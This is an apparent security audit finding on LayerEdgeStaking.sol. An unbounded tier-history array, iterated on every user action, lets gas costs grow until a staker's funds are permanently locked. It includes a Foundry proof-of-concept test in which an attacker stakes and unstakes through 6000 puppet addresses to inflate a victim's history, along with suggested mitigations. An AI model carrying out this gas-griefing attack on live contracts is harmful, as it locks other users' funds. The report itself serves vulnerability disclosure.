# stakerTierHistory is an unbound array that can be extended such that a user's funds are permamently lost

### Summary

In LayerEdgeStaking.sol, an stakerTierHistory is used for each user to track their tier history in a boundless array. This array is iterated through every time a user does any action with the protocol in calculateUnclaimedInterest(), which is called as part of _updateInterest(), which is called as part of every user action. This array is iterated over in its entirety every time this happens, which can make any user operation eventually cost more gas than is permitted in a block, permanently locking the user's tokens in the contract.

### Root Cause

In [calculateUnclaimedInterest()](https://github.com/sherlock-audit/2025-05-layeredge/blob/main/edgen-staking/src/stake/LayerEdgeStaking.sol#L419-L426), the user's tier history is iterated through in its entirety.

```solidity
        for (uint256 i = 0; i < userTierHistory.length; i++) {
            if (userTierHistory[i].timestamp <= fromTime) {
                currentTier = userTierHistory[i].to;
                relevantStartIndex = i;
            } else {
                break;
            }
        }
```

There is another loop which goes through the array starting at a given index:

```solidity
        for (uint256 i = relevantStartIndex + 1; i < userTierHistory.length; i++) {
```

This index is added to every time the user changes tier, which can happen because of other users staking and unstaking tokens. This happens in _recordTierChange:

```solidity
        stakerTierHistory[user].push(TierEvent({from: old, to: newTier, timestamp: currentTime}));
```

This means that if a user sticks around in the staking pool long enough, organic user activity can lock his funds permanently. Additionally, an attacker can abuse the system by staking and unstaking small amounts over and over again to increase the length of a user's tier history array.

Additionally, every time the user's tier is iterated through the system, it also iterates through every apy change for that tier. This has a multiplicative effect on gas consumption, such that every apy change in the protocol's history will drastically decrease the number of tier changes a user needs to experience to be locked out of his funds.

### Internal Pre-conditions

The affected user must be staked and not be first in line.

### External Pre-conditions

No external preconditions.

### Attack Path

1. A user stakes a position
2. Whether because of organic activity or an attack, the user crosses the tier boundary several times
3. The user can now no longer withdraw

### Impact

The affected user loses all staked funds and can never withdraw.

### PoC

Please copy and paste this in LayerEdgeStakingTest.t.sol. Please run with an increased gas limit - forge test -vvvv --mt test_audit_gas_bomb --gas-limit 1000000000000

```solidity
function test_audit_gas_bomb() public {
    // NOTE must be run with high gas limit
    // forge test -vvvv --mt test_audit_gas_bomb --gas-limit 1000000000000
    address attacker = makeAddr("attackerAttacker");
    vm.startPrank(admin);
    token.transfer(attacker, MIN_STAKE * 10000);

    setupMultipleStakers(9);

    vm.startPrank(attacker);
    token.approve(address(staking), type(uint256).max);

    for (uint256 i; i < 6000; i++) {
        address puppet = makeAddr(vm.toString(100001 + i));
        vm.startPrank(attacker);
        token.transfer(puppet, MIN_STAKE);
        vm.startPrank(puppet);
        token.approve(address(staking), MIN_STAKE);
        staking.stake(MIN_STAKE);
        staking.unstake(MIN_STAKE);
    }

    // bob's user history has been appended to so many times that he can't function
    // any function he calls will revert because calculateUnclaimedInterest will take 45M gas
    uint256 gasBefore = gasleft();
    staking.getAllInfoOfUser(bob);
    uint256 gasAfter = gasleft();
    uint256 gasSpent = gasBefore - gasAfter;
    console2.log(gasSpent); // according to the log, 87M gas spent, according to the trace, 45M
    // either way, too much for bob to be able to do anything, his stake is stuck
}
```

### Mitigation

Consider storing a starting index for users so that the function doesn't iterate through every item every time. This would make it so that although the DOS is possible, as long as the user calls any function on the protocol every now and then the gas would remain within bounds. Currently, the whole thing is iterated over every time which given sufficient user activity can cause problems. Alternatively, allow users to collect interest with a function that processes n amount of tier changes so that the process can be broken into smaller transactions.
